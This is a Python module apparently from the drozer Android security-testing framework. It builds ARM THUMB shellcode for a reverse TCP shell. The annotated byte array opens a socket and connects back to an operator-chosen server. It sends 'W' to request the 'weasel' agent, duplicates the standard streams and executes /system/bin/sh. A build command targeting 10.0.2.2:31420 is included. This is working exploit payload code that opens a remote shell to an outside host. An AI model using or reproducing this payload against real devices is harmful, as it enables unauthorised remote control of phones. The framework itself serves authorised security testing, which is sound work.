from drozer.modules import common, Module

class ARMEABI(Module, common.ShellCode):

    name = "weasel through a reverse TCP Shell (ARMEABI)"
    description = """
    Run weasel through a reverse TCP shell connection, to establish a foothold on the
    device.
    
    This module connects to the drozer Server, and sends 0x57 (W) to request
    weasel. The drozer Server will attempt to transfer and run weasel, establishing
    some kind of connection back to the server.
    
    weasel will establish a connection back in one of a few ways:
    
      * a full Agent
      * a stripped-down Agent
      * a reverse shell
    
    You can collect the shell by connecting to the server and sending 'COLLECT'
    as the first line.
    """
    examples = """
    $ drozer shellcode build weasel.reverse_tcp.armeabi --server 10.0.2.2:31420
                                                        --format U
    """
    author = "Tyrone (@mwrlabs)"
    date = "2013-06-18"
    license = "BSD (3 clause)"
    module_type = "shellcode"
    path = ["weasel.reverse_tcp"]
    
    def generate(self, arguments):
        self.append([# Switch to THUMB mode for more compact shellcode
                     0x01, 0x10, 0x8f, 0xe2,     # add   r1, pc, #1
                     0x11, 0xff, 0x2f, 0xe1,     # bx    r1
                     
                     # socket() - store fd in r3
                     0x02, 0x20,                 # mov   r0, #2
                     0x01, 0x21,                 # mov   r1, #1
                     0x52, 0x40,                 # eor   r2, r2
                     0x64, 0x27,                 # mov   r7, #100
                     0xb5, 0x37,                 # add   r7, r7, #181
                     0x01, 0xdf,                 # svc   1
                     0x03, 0x1c,                 # mov   r3, r0
                     
                     # connect()
                     0x10, 0x22,                 # mov   r2, #16
                     0x09, 0xa1,                 # add   r1, pc, #36
                     0x02, 0x37,                 # add   r7, r7, #2
                     0x01, 0xdf,                 # svc   1
                     
                     # write('W')
                     0x18, 0x1c,                 # mov   r0, r3
                     0x01, 0x22,                 # mov   r2, #1
                     0x04, 0x27,                 # mov   r7, #4
                     0x08, 0xa1,                 # add   r1, pc, #32
                     0x01, 0xdf,                 # svc   1

                     # dup2() stderr, stdout and stdin
                     0x02, 0x21,                 # mov   r1, #2
                     0x3f, 0x27,                 # mov   r7, #63
                     
                     0x18, 0x1c,                 # mov   r0, r3
                     0x01, 0xdf,                 # svc   1
                     0x01, 0x39,                 # sub   r1, #1
                     0xfb, 0xd5,                 # bpl   <block>

                     # execve('/system/bin/sh')
                     0x52, 0x40,                 # eor   r2, r2
                     0x05, 0xa0,                 # add   r0, pc, #20
                     0x05, 0xb4,                 # push  {r0, r2}
                     0x69, 0x46,                 # mov   r1, sp
                     0x0b, 0x27,                 # mov   r7, #11
                     0x01, 0xdf,                 # svc   1
                     0x02, 0x00 ])
        self.append(self.hexifyInt32(int(arguments.server[1])))
        self.append(self.hexifyInetAddr(arguments.server[0]))
        self.append(self.hexifyString("W"))     # 'W' to indicate weasel
        self.append(self.hexifyString("AA"))    # Padding
        self.append(self.hexifyString("/system/bin/sh"))
        self.append(self.hexifyNull())
        